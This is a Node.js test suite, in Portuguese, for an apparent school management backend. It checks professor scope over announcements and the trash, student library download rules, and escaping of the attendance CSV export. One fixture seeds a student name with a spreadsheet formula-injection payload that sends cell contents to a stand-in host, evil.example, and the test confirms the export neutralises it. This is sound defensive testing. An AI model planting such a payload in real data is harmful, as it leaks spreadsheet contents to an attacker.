// Revisão da integração (rodada 3): escopo do professor em avisos e na lixeira, regra
// única da biblioteca do aluno (listagem e download) e CSV de presença com a fórmula
// neutralizada. Cada teste falha no comportamento antigo.
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const request = require('supertest');

const tempRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'iclass-escopo-prof-test-'));
process.env.ICLASS_DATA_DIR = tempRoot;
process.env.ICLASS_CONTENT_DIR = path.join(tempRoot, 'content');
process.env.ICLASS_ARCHIVE_DIR = path.join(tempRoot, 'archives');
process.env.TEST_MODE = '1';

const db = require('../../backend/database.js');
const runtimePaths = require('../../backend/runtimePaths.js');
const fileStore = require('../../backend/utils/storage.js');
const { createApp } = require('../../backend/server.js');

let app;
const COURSE = 'curso-escopo';
const adminToken = 'admin-token-escopo';
const professorToken = 'professor-token-escopo';
const tokens = { ana: 'token-ana-escopo', zeca: 'token-zeca-escopo' };
const PDF = Buffer.from('%PDF-1.4\n%escopo\n1 0 obj<<>>endobj\ntrailer<<>>\n%%EOF\n');

function seed() {
    db.memory.admins = [
        { email: 'admin@escopo.local', name: 'Admin', role: 'admin', password: db.hashPassword('x') },
        {
            email: 'prof@escopo.local', name: 'Professor', role: 'professor', password: db.hashPassword('x'),
            assignedClasses: [{ courseId: COURSE, className: '1DES' }],
            additionalPermissions: ['page.system', 'system.manage'],
        },
    ];
    db.memory.adminSessions = {
        [adminToken]: { email: 'admin@escopo.local', createdAt: Date.now(), lastSeen: Date.now() },
        [professorToken]: { email: 'prof@escopo.local', createdAt: Date.now(), lastSeen: Date.now() },
    };
    db.memory.courses = [{ id: COURSE, name: 'Curso', structure: [] }];
    db.memory.classes = [
        { name: '1DES', courseId: COURSE, period: 'Manhã', onlineExamConfigs: {} },
        { name: '2DES', courseId: COURSE, period: 'Tarde', onlineExamConfigs: {} },
    ];
    db.memory.students = [
        { name: 'Ana', email: 'ana@escopo.local', status: 'Ativo', password: db.hashPassword('123'), classes: [{ name: '1DES', courseId: COURSE }], studentClass: '1DES' },
        { name: 'Zeca Dois', email: 'zeca@escopo.local', status: 'Ativo', password: db.hashPassword('123'), classes: [{ name: '2DES', courseId: COURSE }], studentClass: '2DES' },
    ];
    db.memory.sessions = {};
    for (const [name, token] of Object.entries(tokens)) {
        db.memory.sessions[`${name}@escopo.local`] = { token, lastSeen: Date.now(), createdAt: Date.now(), ip: '::ffff:127.0.0.1' };
    }
    db.memory.announcements = [];
    db.memory.library = [];
    db.memory.attendance = [];
    db.memory.submissions = [];
    db.memory.auditLogs = [];
    db.memory.studentExamState = {};
    db.memory.examApplications = [];
    fs.rmSync(runtimePaths.TRASH_DIR, { recursive: true, force: true });
    fs.mkdirSync(runtimePaths.UPLOADS_DIR, { recursive: true });
}

const asAdmin = req => req.set('x-admin-session', adminToken);
const asProfessor = req => req.set('x-admin-session', professorToken);

test.before(async () => { await db.init(); app = createApp(); });
test.beforeEach(() => { seed(); });
test.after(async () => {
    await new Promise(resolve => setTimeout(resolve, 1500));
    await db.close();
    fs.rmSync(tempRoot, { recursive: true, force: true });
});

// ---------------------------------------------------------------- Avisos

test('[UC-ADMIN-001] aviso para toda a instituição: o professor lê, mas não edita, não redireciona e não exclui', async () => {
    const created = await asAdmin(request(app).post('/api/admin/announcements')).send({ title: 'Recado da direção', message: 'Reunião geral', target: 'todos' });
    assert.equal(created.status, 200, created.body.error);
    const id = created.body.announcement.id;

    const list = await asProfessor(request(app).get(`/api/admin/announcements?courseId=${COURSE}&studentClass=1DES`)).expect(200);
    const seen = list.body.find(item => item.id === id);
    assert.ok(seen, 'o professor continua vendo o aviso da direção');
    assert.equal(seen.canEdit, false);

    const hijack = await asProfessor(request(app).post('/api/admin/announcements/update')).send({
        id, title: 'Trocado pelo professor', message: 'x', target: 'turma', targetValue: '1DES', courseId: COURSE, studentClass: '1DES',
    });
    assert.equal(hijack.status, 403, 'antes: 200 e o aviso da direção virava aviso da turma do professor');
    const removed = await asProfessor(request(app).post('/api/admin/announcements/delete')).send({ id });
    assert.equal(removed.status, 403, 'antes: 200 com removed 1');
    const stored = db.memory.announcements.find(item => item.id === id);
    assert.deepEqual([stored.title, stored.target, stored.targetValue], ['Recado da direção', 'todos', '']);

    const adminList = await asAdmin(request(app).get('/api/admin/announcements')).expect(200);
    assert.equal(adminList.body.find(item => item.id === id).canEdit, true);
    await asAdmin(request(app).post('/api/admin/announcements/delete')).send({ id }).expect(200);
    assert.equal(db.memory.announcements.some(item => item.id === id), false);
});

test('[UC-ADMIN-001] professor edita e exclui o aviso da própria turma, sem levar o alvo para fora do escopo', async () => {
    const created = await asProfessor(request(app).post('/api/admin/announcements')).send({
        title: 'Prova remarcada', message: 'Sexta', target: 'turma', targetValue: '1DES', courseId: COURSE, studentClass: '1DES',
    });
    assert.equal(created.status, 200, created.body.error);
    const id = created.body.announcement.id;
    const list = await asProfessor(request(app).get(`/api/admin/announcements?courseId=${COURSE}&studentClass=1DES`)).expect(200);
    assert.equal(list.body.find(item => item.id === id).canEdit, true);

    await asProfessor(request(app).post('/api/admin/announcements/update')).send({
        id, title: 'Para todos', message: 'x', target: 'todos', courseId: COURSE, studentClass: '1DES',
    }).expect(403);
    await asProfessor(request(app).post('/api/admin/announcements/update')).send({
        id, title: 'Para a outra turma', message: 'x', target: 'turma', targetValue: '2DES', courseId: COURSE,
    }).expect(403);
    assert.equal(db.memory.announcements.find(item => item.id === id).targetValue, '1DES');

    const edited = await asProfessor(request(app).post('/api/admin/announcements/update')).send({
        id, title: 'Prova remarcada para segunda', message: 'Segunda', target: 'turma', targetValue: '1DES', courseId: COURSE, studentClass: '1DES',
    });
    assert.equal(edited.status, 200, edited.body.error);
    await asProfessor(request(app).post('/api/admin/announcements/delete')).send({ id }).expect(200);
    assert.equal(db.memory.announcements.length, 0);

    // Aviso da outra turma (do administrador): fora do escopo, nem aparece nem sai.
    const other = await asAdmin(request(app).post('/api/admin/announcements')).send({
        title: 'Só 2DES', message: 'x', target: 'turma', targetValue: '2DES', courseId: COURSE, studentClass: '2DES',
    });
    await asProfessor(request(app).post('/api/admin/announcements/delete')).send({ id: other.body.announcement.id }).expect(403);
    assert.equal(db.memory.announcements.length, 1);
});

// ---------------------------------------------------------------- Lixeira

test('[UC-BACKUP-001] lixeira do professor: pasta de aluno e atestado só para o administrador; material só da turma dele', async () => {
    // Atestado da aluna da outra turma e exclusão da aluna (a pasta vai para a lixeira).
    const upload = await asAdmin(request(app).post('/api/admin/attendance/justification-upload'))
        .field('studentEmail', 'zeca@escopo.local').field('courseId', COURSE).field('studentClass', '2DES').field('scope', 'class')
        .attach('file', PDF, { filename: 'atestado-medico-zeca.pdf', contentType: 'application/pdf' });
    assert.equal(upload.status, 200, upload.body.error);
    await asAdmin(request(app).post('/api/admin/delete-student')).send({ email: 'zeca@escopo.local' }).expect(200);

    // Material da biblioteca excluído em cada turma.
    for (const [id, studentClass, filename] of [['lib_1des', '1DES', 'material-1des.pdf'], ['lib_2des', '2DES', 'material-2des.pdf']]) {
        fs.writeFileSync(path.join(runtimePaths.UPLOADS_DIR, filename), PDF);
        db.memory.library.push({ id, kind: 'file', courseId: COURSE, studentClass, filename, url: `/uploads/${filename}`, name: filename });
        const deleted = await asAdmin(request(app).post('/api/admin/library/delete')).send({ id, courseId: COURSE, studentClass, scope: 'class' });
        assert.equal(deleted.status, 200, deleted.body.error);
    }

    const all = await asAdmin(request(app).get('/api/admin/trash')).expect(200);
    const folder = all.body.find(entry => /^alunos\//.test(entry.originalRel));
    assert.ok(folder, JSON.stringify(all.body));
    assert.equal(all.body.length, 3);

    const mine = await asProfessor(request(app).get('/api/admin/trash')).expect(200);
    assert.deepEqual(mine.body.map(entry => entry.name), ['material-1des.pdf'], 'antes o professor listava a pasta "alunos/Zeca Dois" com o atestado');
    await asProfessor(request(app).post('/api/admin/trash/delete')).send({ id: folder.id }).expect(403);
    await asProfessor(request(app).post('/api/admin/trash/restore')).send({ id: folder.id }).expect(403);
    const other = all.body.find(entry => entry.name === 'material-2des.pdf');
    await asProfessor(request(app).post('/api/admin/trash/restore')).send({ id: other.id }).expect(403);
    await asProfessor(request(app).post('/api/admin/trash/empty')).send({}).expect(200);

    const after = await asAdmin(request(app).get('/api/admin/trash')).expect(200);
    assert.deepEqual(after.body.map(entry => entry.name).sort(), ['Zeca Dois', 'material-2des.pdf'], 'o atestado não se perde');
    assert.ok(fs.existsSync(path.join(fileStore.LIXEIRA_DIR, folder.id, 'atestados')));
    await asAdmin(request(app).post('/api/admin/trash/restore')).send({ id: folder.id }).expect(200);
});

test('[UC-BACKUP-001] item antigo da lixeira sem curso nem autor fica com o administrador', async () => {
    const loose = path.join(runtimePaths.UPLOADS_DIR, 'arquivo-antigo.pdf');
    fs.writeFileSync(loose, PDF);
    const id = fileStore.moveToTrash(loose);
    assert.ok(id);
    const mine = await asProfessor(request(app).get('/api/admin/trash')).expect(200);
    assert.equal(mine.body.length, 0);
    await asProfessor(request(app).post('/api/admin/trash/delete')).send({ id }).expect(403);
    const all = await asAdmin(request(app).get('/api/admin/trash')).expect(200);
    assert.equal(all.body.length, 1);
});

// ---------------------------------------------------------------- Biblioteca

test('[UC-SIGILO-001] biblioteca do aluno: download segue a regra da listagem (turma do item e itens ocultos)', async () => {
    const files = ['so-1des.pdf', 'oculto-2des.pdf', 'curso.pdf'];
    files.forEach(name => fs.writeFileSync(path.join(runtimePaths.UPLOADS_DIR, name), PDF));
    db.memory.library = [
        { id: 'lib_class', kind: 'file', courseId: COURSE, studentClass: '1DES', filename: 'so-1des.pdf', url: '/uploads/so-1des.pdf', name: 'Material só 1DES' },
        { id: 'lib_course_hidden', kind: 'file', courseId: COURSE, studentClass: '', filename: 'oculto-2des.pdf', url: '/uploads/oculto-2des.pdf', name: 'Oculto na 2DES' },
        { id: 'lib_hidden_x', courseId: COURSE, studentClass: '2DES', sourceLibraryId: 'lib_course_hidden', hidden: true },
        { id: 'lib_course', kind: 'file', courseId: COURSE, studentClass: '', filename: 'curso.pdf', url: '/uploads/curso.pdf', name: 'Do curso' },
    ];

    const listZeca = await request(app).get(`/api/student/library?courseId=${COURSE}&studentClass=2DES`).set('x-session-token', tokens.zeca).expect(200);
    assert.deepEqual(listZeca.body.map(item => item.name), ['Do curso']);
    await request(app).get('/uploads/so-1des.pdf').set('x-session-token', tokens.zeca).expect(403);
    await request(app).get('/uploads/oculto-2des.pdf').set('x-session-token', tokens.zeca).expect(403);
    await request(app).get('/uploads/curso.pdf').set('x-session-token', tokens.zeca).expect(200);

    const listAna = await request(app).get(`/api/student/library?courseId=${COURSE}&studentClass=1DES`).set('x-session-token', tokens.ana).expect(200);
    assert.deepEqual(listAna.body.map(item => item.name).sort(), ['Do curso', 'Material só 1DES', 'Oculto na 2DES']);
    for (const name of files) await request(app).get(`/uploads/${name}`).set('x-session-token', tokens.ana).expect(200);
    // Professor e administrador continuam baixando.
    await asProfessor(request(app).get('/uploads/oculto-2des.pdf')).expect(200);
});

// ---------------------------------------------------------------- CSV de presença

test('[UC-PRESENCA-002] CSV de presença neutraliza fórmula no nome do aluno, como a exportação de notas', async () => {
    db.memory.students[0].name = '=HYPERLINK("http://evil.example/?x="&A1;"Clique")';
    db.memory.attendance = [{
        id: 'att_1', studentEmail: 'ana@escopo.local', studentClass: '1DES', courseId: COURSE, date: '2026-10-15', origin: 'chamada',
        aulas: [{ ordem: 1, disciplinaId: '', inicio: '07:30', status: 'presente', hora: '' }], timestamp: Date.now(),
    }];
    const csv = await asAdmin(request(app).get(`/api/admin/attendance/export?courseId=${COURSE}&studentClass=1DES`)).expect(200);
    assert.ok(csv.text.startsWith('﻿'), 'BOM para os acentos no Excel');
    const line = csv.text.split('\r\n').find(row => row.includes('ana@escopo.local'));
    assert.ok(line, csv.text);
    assert.match(line, /^2026-10-15;"'=HYPERLINK\(""http:\/\/evil\.example\/\?x=""&A1;""Clique""\)";ana@escopo\.local;/);
    // Nenhum campo começa com um caractere de fórmula.
    assert.doesNotMatch(csv.text, /(^|;)"?[=+@]/m);
});
